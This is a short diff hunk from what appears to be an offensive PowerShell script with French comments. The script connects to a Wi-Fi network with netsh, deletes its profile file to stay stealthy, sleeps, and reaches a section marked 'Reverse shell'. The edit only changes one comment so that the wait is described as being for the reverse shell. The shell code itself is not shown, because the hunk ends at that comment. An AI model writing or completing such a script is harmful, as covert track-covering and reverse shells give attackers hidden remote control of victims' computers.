@@ -40,7 +40,7 @@ netsh wlan connect name="$SSID" > $null 2>&1
 # Supprime le fichier pour rester furtif
 Remove-Item $profilePath -Force -ErrorAction SilentlyContinue
 
-# Attente pour laisser le temps au réseau
+# Attente pour laisser le temps pour le revshell
 Start-Sleep -Seconds 15
 
 # Reverse shell
